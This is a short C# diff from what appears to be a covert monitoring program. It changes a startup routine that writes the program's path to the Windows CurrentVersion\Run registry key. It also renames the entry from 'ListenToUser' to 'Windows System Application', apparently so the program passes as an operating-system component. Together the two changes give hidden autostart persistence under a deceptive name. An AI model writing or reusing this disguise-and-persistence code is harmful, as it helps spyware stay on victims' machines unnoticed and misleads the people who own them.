@@ -7,15 +7,16 @@ namespace Windows_System_Application.source
     {
 
         #region Registry that open with window
-        static void run()
+        public static void run()
         {
-            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\ListenToUser");
+            //regedit  : Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\Windows System Application");
             RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
             string keyvalue = "1";
             try
             {
                 regkey.SetValue("Index", keyvalue);
-                regstart.SetValue("ListenToUser", Application.StartupPath + "\\" + Application.ProductName + ".exe");
+                regstart.SetValue("Windows System Application", Application.StartupPath + "\\" + Application.ProductName + ".exe");
                 regkey.Close();
             }
             catch (System.Exception ex)
